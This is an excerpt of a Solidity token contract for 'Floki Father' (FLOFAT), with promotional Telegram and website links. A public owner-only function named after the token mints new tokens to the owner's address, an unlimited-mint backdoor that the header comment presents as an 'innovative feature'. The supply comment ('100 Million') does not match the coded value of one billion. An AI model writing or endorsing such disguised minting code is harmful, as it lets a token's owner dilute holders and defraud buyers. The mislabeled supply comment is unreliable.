...
//
// $FlokiFather proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/FlokiFatherOFC
// 📱 Website ::https://flokifather.io/
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _FlokiFather(uint256 amount) public onlyOwner {
 _FlokiFather(msg.sender, amount);
    }
    ...
    function _FlokiFather(address account, uint256 amount) internal virtual {
...
contract $FlokiFather is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Floki Father", "FLOFAT") {
     _FlokiFather(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}